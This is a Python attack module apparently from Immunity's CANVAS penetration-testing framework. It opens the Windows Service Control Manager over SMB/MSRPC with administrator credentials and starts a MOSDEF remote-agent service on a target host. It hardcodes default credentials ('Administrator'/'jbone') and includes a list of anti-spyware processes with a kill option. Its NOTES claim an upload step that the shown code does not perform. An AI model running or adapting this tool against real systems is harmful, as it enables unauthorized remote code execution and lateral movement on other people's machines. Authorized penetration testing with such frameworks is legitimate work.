#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

NOTES="""
Installs a remote MOSDEF service by uploading it and then starting it

For Win32
   This module uses SMB to upload the service using a given username and password. It then
   uses the service control manager to start the service.
   
   The MOSDEFService itself is modified to listen on whatever port the user wishes.
"""

import sys
import os
if "." not in sys.path:
    sys.path.append(".")
from exploitutils import *
from tcpexploit import *

# GUI info
NAME="Start Remote Service"
DESCRIPTION="Starts a remote service over SMB"
DOCUMENTATION={}
VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Commands"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows", "i386"] ]
                                                                                

# VULNERABLE VERSION LIST (Server: )

TARGETS = {
    # name, delta, retloc, retaddr
    0 : ["Autoversioning (based on remote osdetect)", 0, 0, 0],
}

antispywarelist=["gcasDtServ.exe","gcasServ.exe"]

import msrpc

from libs.dcemarshall import *

from win32MosdefShellServer import SC_MANAGER_ALL_ACCESS
from win32MosdefShellServer import SERVICE_WIN32_OWN_PROCESS
from win32MosdefShellServer import SERVICE_AUTO_START
from win32MosdefShellServer import SERVICE_ERROR_IGNORE
from win32MosdefShellServer import SERVICE_ALL_ACCESS
from win32MosdefShellServer import SERVICE_BOOT_START
from win32MosdefShellServer import SERVICE_AUTO_START
from ExploitTypes.svcctlexploit import svcctlexploit

class theexploit(tcpexploit, svcctlexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.version = 0
        self.host = ""
        self.port = 5555
        self.name=NAME
        self.destdir={}
        self.destdir["win32"]="%SYSTEMROOT%"
        self.sourceDict={}
        self.sourceDict["win32"]="extras/mosdefservice.exe"
        self.binaryName="mosdefservice.exe"
        self.serviceName="helloservice"
        self.displayName="Hello Service"
        self.killantispyware=0
        self.ignoreantispyware=0
        self.msrpcuser="Administrator"
        self.msrpcpassword="jbone"
        self.domain=""
        return
    
    def test(self):
        "Not completely sure what I want to do with this yet"
        ret=0
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        s = self.connectTo(self.host,self.port)
        if s:
            self.log("Something is already listening on that port!")
            return 0 
        return 1
    
    def getargs(self):
        self.host = self.target.interface 
        self.port = int(self.argsDict.get("port", self.port))
        self.displayName = self.argsDict.get("displayName",self.displayName)
        self.serviceName = self.argsDict.get("serviceName",self.serviceName)
        self.binaryName = self.argsDict.get("binaryName",self.binaryName)
        self.msrpcuser= self.argsDict.get("msrpcuser", self.msrpcuser)
        self.msrpcpassword= self.argsDict.get("msrpcpassword", self.msrpcpassword)
        self.domain=self.argsDict.get("domain",self.domain)
        return
    
    def run(self):
        finalresult=0
        self.getargs()
        node=self.argsDict["passednodes"][0]

        osd=self.exploitnodes("osdetect",[node])
        self.log("OSDetected: %s"%osd)
        if osd[0].find("Windows") > -1:
            nodeos="win32"
            self.log("Starting Windows Service")
            
            ret=self.OpenSCManager(self.host,access=SC_MANAGER_ALL_ACCESS)
            if not ret:
                self.log("Was unable to open SCManager")
                return 0
            scm=ret
            serviceName=self.serviceName
            self.log("Calling OpenService %s"%serviceName)
            ret,handler=self.OpenService(scm,serviceName,SERVICE_ALL_ACCESS) 
            if ret not in [0]:
                self.log("Was unable to call OpenService!")
                return 0
            
            #so let's just start it up!
            #self.log("Handler=%s"%prettyhexprint(handler))
            ret=self.StartService(handler)
            self.log("StartService returned %x"%ret)
            if ret==0x43b:
                self.log("The executable specified in this service has some sort of issue")
            #this would be nice...
            #ret=self.QueryServiceStatus()
            if ret==0:
                self.log("SUCCESS!")

            #test StopService()
            #time.sleep(3)
            #ret=self.StopService(handler)
            #if ret==0:
            #    self.log("SUCCESS!")
            #time.sleep(3)
            
            ret=self.CloseServiceHandle(handler)
            
            ret=self.CloseServiceHandle(scm)
       
            finalresult=1
                    
        return finalresult

    def displayVersions(self):
        i = 0
        for listline in TARGETS.values():
            print "%d : %s"% (i, listline[0])
            i += 1

    
if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

